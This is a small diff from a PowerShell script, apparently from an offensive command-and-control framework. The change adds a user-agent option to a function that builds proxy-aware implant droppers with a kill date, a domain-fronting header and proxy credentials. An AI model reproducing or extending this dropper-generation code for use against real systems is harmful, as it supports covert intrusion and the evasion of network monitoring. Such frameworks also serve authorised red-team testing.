@@ -755,9 +755,9 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][string]$proxyurl
     )
     if ($Insecure -eq "Yes") {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure
+        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent
     } else {
-        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
+        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent
     }
             
     $payload = createrawpayload -command $command
